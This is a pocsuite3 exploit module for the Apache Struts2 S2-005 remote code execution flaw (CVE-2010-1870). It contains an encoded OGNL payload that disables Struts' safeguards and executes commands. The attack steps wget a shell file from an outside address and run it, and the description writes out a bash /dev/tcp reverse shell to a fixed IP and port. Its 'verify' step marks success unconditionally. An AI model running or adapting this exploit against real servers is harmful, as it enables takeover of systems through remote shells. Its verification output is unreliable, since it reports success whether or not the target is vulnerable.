import os, base64
from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, OptString, OptIP, OptPort, get_listener_ip, get_listener_port, generate_shellcode_list
from pocsuite3.lib.utils import random_str
from pocsuite3.lib.core.enums import OS_ARCH, OS

# 'Result':{
#    'DBInfo' :   {'Username': 'xxx', 'Password': 'xxx', 'Salt': 'xxx' , 'Uid':'xxx' , 'Groupid':'xxx'},
#    'ShellInfo': {'URL': 'xxx', 'Content': 'xxx' },
#    'FileInfo':  {'Filename':'xxx','Content':'xxx'},
#    'XSSInfo':   {'URL':'xxx','Payload':'xxx'},
#    'AdminInfo': {'Uid':'xxx' , 'Username':'xxx' , 'Password':'xxx' }
#    'Database':  {'Hostname':'xxx', 'Username':'xxx',  'Password':'xxx', 'DBname':'xxx'},
#    'VerifyInfo':{'URL': 'xxx' , 'Postdata':'xxx' , 'Path':'xxx'}
#    'SiteAttr':  {'Process':'xxx'}
#    'Stdout': 'result output string'
# }

class DemoPOC(POCBase):
    vulID = 'S2-005 CVE-2010-1870'
    version = '1.0'
    author = ['cz']
    vulDate = '2019-11-15'
    createDate = '2019-11-15'
    updateDate = '2019-11-15'
    references = ['https://b1ue.cn/archives/107.html']
    name = 'S2-005 RCE'
    appPowerLink = ''
    appName = 'Struts2'
    appVersion = '2.x-2.1.8.1'
    vulType = 'Romote Code Execution'
    desc = '''s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开。'''
    samples = []
    install_requires = ['']
    pocDesc = '''该POC没有回显，需要下载反弹shell文件，进行verify和attack。
                     该POC的cmd不能出现/ : . 等字符，shellDownloadUrl务必设置成192.168.1.138/s
                     文件内容为/bin/bash -I >& /dev/tcp/192.168.1.138/6666 0>&1
                     同样的只返回Success。
                     爸爸今天为了调你，光是搭环境就搭了一天，你这玩意还没有回显，气死了气死了!!!'''
    testedEnv = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

    def _options(self):
        o = OrderedDict()
        o['shellDownloadUrl'] = OptString('', description='下载shell的地址', require=True)
        o['shellWritePath'] = OptString('/usr/local/tomcat/webapps/ROOT', description='下载的shell保存的路径，也用于verify验证漏洞存在性', require=True)
        o['reverseShellIP'] = OptIP('', description='反弹shell地址', require=True)
        o['reverseShellPort'] = OptPort(6666, description='反弹shell端口', require=True)
        return o

    def _verify(self):
        result = {}

        def execCmd(cmd):
            cmd = cmd.replace(' ', '@')
            payload = '''(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22{}%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1'''.format(cmd)
            r = requests.get(self.url, params=payload)
            pass

        cmd = 'wget {}'.format(self.get_option('shellDownloadUrl'))
        execCmd(cmd)
        cmd = '/bin/bash s'
        execCmd(cmd)

        # 存在一些特殊字符，这个poc不能用
        # _list = generate_shellcode_list(listener_ip=self.get_option('reverseShellIP'), listener_port=self.get_option('reverseShellPort'),
        #                                 os_target=OS.LINUX,
        #                                 os_target_arch=OS_ARCH.X64)
        # for i in _list:
        #     i = i.replace(' ', '@')
        #     i = quote(i)
        #     payload = '''(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22{}%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1'''.format(i)
        #     r = requests.get(self.url, params=payload)

        payload = '''(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22{}%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1'''.format('CMD')
        try:
            if True:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    
register_poc(DemoPOC)
